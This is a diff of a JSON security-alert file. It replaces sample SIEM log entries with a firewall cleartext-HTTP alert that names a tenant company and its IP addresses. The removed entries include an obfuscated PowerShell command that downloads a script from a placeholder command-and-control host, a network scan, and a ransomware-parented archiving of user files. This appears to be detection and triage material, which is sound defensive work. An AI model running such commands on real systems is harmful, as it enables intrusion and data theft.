@@ -1,54 +1,74 @@
-[
-  {
-    "timestamp": "2023-10-27T14:32:15.123Z",
-    "hostname": "WS-DC-01",
-    "source_ip": "192.168.1.150",
-    "destination_ip": "203.0.113.45",
-    "process_name": "powershell.exe",
-    "command_line": "powershell.exe -ExecutionPolicy Bypass -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcAA6AC8ALwBjAG4AYwAuAGMAbwBtAC8AZABvAHcAbgBsAG8AYQBkACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAEMAOgBcAFQAZQBtAHAAXABzAGMAcgBpAHAAdAAuAHAAcwAxACIA",
-    "parent_process": "explorer.exe",
-    "user": "CORP\\jdoe",
-    "log_source": "Windows Security Log",
-    "event_id": "4688",
-    "severity": "High"
-  },
-  {
-    "timestamp": "2023-10-27T15:45:22.456Z",
-    "hostname": "WEB-SRV-02",
-    "source_ip": "10.0.0.25",
-    "destination_ip": "8.8.8.8",
-    "process_name": "nmap.exe",
-    "command_line": "nmap -sS -O 192.168.1.0/24",
-    "parent_process": "cmd.exe",
-    "user": "NT AUTHORITY\\SYSTEM",
-    "log_source": "EDR Alert",
-    "event_id": "EDR-2023-10-27-001",
-    "severity": "Medium"
-  },
-  {
-    "timestamp": "2023-10-27T16:12:08.789Z",
-    "hostname": "FILE-SRV-03",
-    "source_ip": "192.168.1.200",
-    "destination_ip": "185.220.101.42",
-    "process_name": "winrar.exe",
-    "command_line": "winrar.exe a -r -ep1 backup.rar C:\\Users\\*\\Documents\\*.docx C:\\Users\\*\\Desktop\\*.pdf",
-    "parent_process": "ransomware.exe",
-    "user": "CORP\\admin",
-    "log_source": "File System Monitor",
-    "event_id": "FSM-2023-10-27-002",
-    "severity": "Critical"
-  },
-  {
-    "timestamp": "2023-10-27T17:23:45.012Z",
-    "hostname": "DB-SRV-01",
-    "source_ip": "172.16.1.100",
-    "destination_ip": "172.16.1.10",
-    "process_name": "sqlcmd.exe",
-    "command_line": "sqlcmd -S localhost -E -Q \"SELECT * FROM users WHERE role='admin'\"",
-    "parent_process": "powershell.exe",
-    "user": "CORP\\dbadmin",
-    "log_source": "Database Audit Log",
-    "event_id": "DB-2023-10-27-003",
-    "severity": "Medium"
+{
+    "id": "b841413b-b3f8-457e-bd62-a12c00b1b731",
+    "alert_id": "MK-TELEMETRY-2025-02-000639",
+    "alert_name": "Cleartext Protocol Usage",
+    "alert_status": "Opened",
+    "tags": "Telemetry",
+    "description": null,
+    "incident_type": null,
+    "aliases": null,
+    "created_at": "2025-02-26T06:48:36.662Z",
+    "created": "2025-02-26T06:48:36.644Z",
+    "case_result": "WaitingAnalysis",
+    "ioc_type": null,
+    "ioc_value": null,
+    "mitre": [],
+    "contexts": {
+      "src_ip": [
+        "192.168.1.39"
+      ],
+      "os": null,
+      "domain": null,
+      "endpoint_type": "Network",
+      "user_priv": null
+    },
+    "detected_time": "2025-02-26T06:47:45.622Z",
+    "ingested_time": null,
+    "attribute_abstract": null,
+    "sla": {
+      "mttd": 2,
+      "mtta": 4,
+      "mttt": 4,
+      "mtti": null,
+      "mttn": null,
+      "mttv": null,
+      "mttr": null
+    },
+    "agent_id": null,
+    "threat_id": null,
+    "local_process_id": null,
+    "process_id": null,
+    "parent_process_id": null,
+    "investigator": null,
+    "rawAlert": "[{\"acknowledged_time\":null,\"id\":\"792199d5-22a9-4161-84c6-8335f256f9fb\",\"version\":-1,\"end_time\":null,\"error_message\":null,\"execution_id\":\"hyd2QJUBTJZLfVdW2w9q_2025-02-26T06:47:45.185414597_e69c7993-349d-494a-9112-cff173e626b2\",\"workflow_id\":\"hyd2QJUBTJZLfVdW2w9q\",\"workflow_name\":\"\",\"associated_alert_ids\":[],\"last_notification_time\":1740552465622,\"severity\":\"1\",\"start_time\":1740552465622,\"state\":\"ACTIVE\",\"bucket_keys\":null,\"parent_bucket_path\":null,\"finding_ids\":\"cbceff3c-c856-4e1b-bbef-47ea16a47895\",\"related_doc_ids\":\"xX8BQZUBBKMM6TtiSfop|icyber-mk-2025.09\",\"clusters\":null,\"associated_queries\":[{\"id\":\"iG1yQJUBuMNt0ti-AsgT\",\"name\":\"Cleartext Protocol Usage\",\"tags\":[\"low\",\"azurites-firewall-new\",\"attack.credential-access\"]}],\"sample_documents\":[{\"_seq_no\":25362050,\"found\":true,\"_index\":\"icyber-mk-2025.09\",\"_source\":{\"observer\":{\"ingress\":{\"interface\":{\"name\":\"lan\"}},\"product\":\"Fortigate\",\"vendor\":\"Fortinet\",\"version\":\"v7.4.4\",\"egress\":{\"interface\":{\"name\":\"wan\"}}},\"@timestamp\":\"2025-02-26T06:45:58.128429184Z\",\"log\":{\"level\":\"notice\"},\"fortinet\":{\"firewall\":{\"sentdelta\":\"3400\",\"srcintfrole\":\"lan\",\"poluuid\":\"b5a41f38-da80-51ec-3b73-2af7afdb5458\",\"durationdelta\":\"128\",\"policytype\":\"policy\",\"sentpkt\":\"184\",\"type\":\"traffic\",\"sentpktdelta\":\"26\",\"vd\":\"root\",\"srccountry\":\"Reserved\",\"appcat\":\"unscanned\",\"dstintfrole\":\"wan\",\"protocol\":\"HTTP\",\"policyid\":\"7\",\"subtype\":\"forward\",\"logid\":\"0000000020\",\"policyname\":\"atsoc\",\"time\":\"1740552357855045380\",\"rcvddelta\":\"1664\",\"trandisp\":\"snat\",\"dstcountry\":\"China\",\"rcvdpktdelta\":\"13\",\"rcvdpkt\":\"114\"}},\"log_source\":\"Fortinet\",\"destination\":{\"port\":\"80\",\"bytes\":\"31993\",\"ip\":\"14.22.9.53\"},\"@version\":\"1\",\"source\":{\"nat\":{\"port\":\"52818\",\"ip\":\"219.75.105.115\"},\"port\":\"52818\",\"bytes\":\"35732\",\"ip\":\"192.168.1.39\"},\"event\":{\"severity\":\"3\",\"duration\":\"773\",\"code\":\"00020\",\"subtype\":\"forward\",\"timezone\":\"+0800\",\"action\":\"accept\",\"type\":\"traffic\"},\"tenant\":{\"name\":\"Ming Kee Umbrellas Factory Pte Ltd\",\"id\":\"MK\"},\"full_log\":\"{\\\"FTNTFGTpoluuid\\\":\\\"b5a41f38-da80-51ec-3b73-2af7afdb5458\\\",\\\"FTNTFGTtrandisp\\\":\\\"snat\\\",\\\"log\\\":{\\\"syslog\\\":{\\\"header\\\":\\\"951 <45>Feb 26 14:45:57 mingkee01\\\"}},\\\"cef\\\":{\\\"name\\\":[\\\"traffic\\\",\\\"forward accept\\\"],\\\"external_id\\\":\\\"8980413\\\",\\\"category\\\":\\\"traffic:forward\\\",\\\"version\\\":\\\"0\\\"},\\\"FTNTFGTpolicyname\\\":\\\"atsoc\\\",\\\"destination\\\":{\\\"port\\\":\\\"80\\\",\\\"bytes\\\":\\\"31993\\\",\\\"ip\\\":\\\"14.22.9.53\\\"},\\\"FTNTFGTsentpkt\\\":\\\"184\\\",\\\"FTNTFGTappcat\\\":\\\"unscanned\\\",\\\"source\\\":{\\\"nat\\\":{\\\"port\\\":\\\"52818\\\",\\\"ip\\\":\\\"219.75.105.115\\\"},\\\"port\\\":\\\"52818\\\",\\\"bytes\\\":\\\"35732\\\",\\\"ip\\\":\\\"192.168.1.39\\\"},\\\"network\\\":{\\\"protocol\\\":\\\"HTTP\\\",\\\"transport\\\":\\\"6\\\"},\\\"FTNTFGTsentdelta\\\":\\\"3400\\\",\\\"observer\\\":{\\\"name\\\":\\\"FGT40FTK2109BLUU\\\",\\\"ingress\\\":{\\\"interface\\\":{\\\"name\\\":\\\"lan\\\"}},\\\"product\\\":\\\"Fortigate\\\",\\\"version\\\":\\\"v7.4.4\\\",\\\"vendor\\\":\\\"Fortinet\\\",\\\"egress\\\":{\\\"interface\\\":{\\\"name\\\":\\\"wan\\\"}}},\\\"FTNTFGTeventtime\\\":\\\"1740552357855045380\\\",\\\"FTNTFGTsubtype\\\":\\\"forward\\\",\\\"ecs\\\":{\\\"observer\\\":{\\\"ingress\\\":{\\\"interface\\\":{\\\"name\\\":\\\"lan\\\"}},\\\"product\\\":\\\"Fortigate\\\",\\\"version\\\":\\\"v7.4.4\\\",\\\"vendor\\\":\\\"Fortinet\\\",\\\"egress\\\":{\\\"interface\\\":{\\\"name\\\":\\\"wan\\\"}}},\\\"log\\\":{\\\"level\\\":\\\"notice\\\"},\\\"fortinet\\\":{\\\"firewall\\\":{\\\"sentdelta\\\":\\\"3400\\\",\\\"srcintfrole\\\":\\\"lan\\\",\\\"poluuid\\\":\\\"b5a41f38-da80-51ec-3b73-2af7afdb5458\\\",\\\"durationdelta\\\":\\\"128\\\",\\\"policytype\\\":\\\"policy\\\",\\\"sentpkt\\\":\\\"184\\\",\\\"type\\\":\\\"traffic\\\",\\\"sentpktdelta\\\":\\\"26\\\",\\\"vd\\\":\\\"root\\\",\\\"srccountry\\\":\\\"Reserved\\\",\\\"appcat\\\":\\\"unscanned\\\",\\\"dstintfrole\\\":\\\"wan\\\",\\\"protocol\\\":\\\"HTTP\\\",\\\"policyid\\\":\\\"7\\\",\\\"subtype\\\":\\\"forward\\\",\\\"logid\\\":\\\"0000000020\\\",\\\"policyname\\\":\\\"atsoc\\\",\\\"time\\\":\\\"1740552357855045380\\\",\\\"rcvddelta\\\":\\\"1664\\\",\\\"trandisp\\\":\\\"snat\\\",\\\"dstcountry\\\":\\\"China\\\",\\\"rcvdpktdelta\\\":\\\"13\\\",\\\"rcvdpkt\\\":\\\"114\\\"}},\\\"log_source\\\":\\\"Fortinet\\\",\\\"destination\\\":{\\\"port\\\":\\\"80\\\",\\\"bytes\\\":\\\"31993\\\",\\\"ip\\\":\\\"14.22.9.53\\\"},\\\"source\\\":{\\\"nat\\\":{\\\"port\\\":\\\"52818\\\",\\\"ip\\\":\\\"219.75.105.115\\\"},\\\"port\\\":\\\"52818\\\",\\\"bytes\\\":\\\"35732\\\",\\\"ip\\\":\\\"192.168.1.39\\\"},\\\"event\\\":{\\\"severity\\\":\\\"3\\\",\\\"duration\\\":\\\"773\\\",\\\"code\\\":\\\"00020\\\",\\\"subtype\\\":\\\"forward\\\",\\\"timezone\\\":\\\"+0800\\\",\\\"action\\\":\\\"accept\\\",\\\"type\\\":\\\"traffic\\\"},\\\"tenant\\\":{\\\"name\\\":\\\"Ming Kee Umbrellas Factory Pte Ltd\\\",\\\"id\\\":\\\"MK\\\"}},\\\"FTNTFGTpolicytype\\\":\\\"policy\\\",\\\"FTNTFGTdurationdelta\\\":\\\"128\\\",\\\"@version\\\":\\\"1\\\",\\\"FTNTFGTpolicyid\\\":\\\"7\\\",\\\"event\\\":{\\\"severity\\\":\\\"3\\\",\\\"action\\\":\\\"accept\\\",\\\"code\\\":\\\"00020\\\"},\\\"FTNTFGTlevel\\\":\\\"notice\\\",\\\"FTNTFGTvd\\\":\\\"root\\\",\\\"FTNTFGTsrccountry\\\":\\\"Reserved\\\",\\\"FTNTFGTdstintfrole\\\":\\\"wan\\\",\\\"FTNTFGTduration\\\":\\\"773\\\",\\\"FTNTFGTrcvdpktdelta\\\":\\\"13\\\",\\\"FTNTFGTdstcountry\\\":\\\"China\\\",\\\"@timestamp\\\":\\\"2025-02-26T06:45:58.065094102Z\\\",\\\"FTNTFGTrcvddelta\\\":\\\"1664\\\",\\\"FTNTFGTtz\\\":\\\"+0800\\\",\\\"FTNTFGTsentpktdelta\\\":\\\"26\\\",\\\"FTNTFGTlogid\\\":\\\"0000000020\\\",\\\"FTNTFGTsrcintfrole\\\":\\\"lan\\\",\\\"FTNTFGTrcvdpkt\\\":\\\"114\\\"}\"},\"_id\":\"xX8BQZUBBKMM6TtiSfop\",\"_version\":1,\"_primary_term\":1}]}]",
+    "events": [
+      {
+        "domain": null,
+        "cmd_line": null,
+        "file_name": null,
+        "file_size": "31993",
+        "file_path": null,
+        "event_type": "traffic",
+        "dst_ip": [
+          "14.22.9.53"
+        ],
+        "parent_process": null,
+        "hash": {
+          "sha1": null,
+          "sha256": null,
+          "md5": null
+        },
+        "hash_malicious": null,
+        "ip_malicious": null,
+        "src_ip": null,
+        "src_port": null,
+        "dst_port": null,
+        "user": null
+      }
+    ],
+    "objectMarking": [
+      {
+        "definition": "Ming Kee Umbrellas Factory Pte Ltd"
+      }
+    ]
   }
-]
